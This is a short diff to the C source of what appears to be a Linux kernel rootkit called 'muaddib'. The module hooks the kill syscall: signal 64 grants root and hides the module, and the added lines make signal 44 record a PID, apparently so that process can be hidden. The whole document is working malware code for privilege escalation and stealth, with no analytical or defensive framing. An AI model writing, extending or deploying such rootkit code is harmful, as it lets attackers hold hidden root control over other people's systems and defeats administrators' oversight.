@@ -2,6 +2,7 @@
 
 static struct list_head *prev_module;
 static short hidden = 0;
+char hide_pid[NAME_MAX];
 
 #ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*og_kill)(const struct pt_regs *);
@@ -30,7 +31,7 @@ asmlinkage int muaddib_kill(const struct pt_regs *regs)
 {
     void set_root(void);
 
-    // pid_t pid = regs->di;
+    pid_t pid = regs->di;
     int sig = regs->si;
 
     if(sig == 64){
@@ -66,6 +67,13 @@ asmlinkage int muaddib_kill(const struct pt_regs *regs)
             hidden = 0;
             return 0;
         }
+    }
+    else if(sig == 44){
+        #ifdef DEBUGMSG
+        printk(KERN_INFO "muaddib: hiding %d", pid);
+        #endif
+        sprintf(hide_pid, "%d", pid);
+        return 0;
     }
     return og_kill(regs);
 
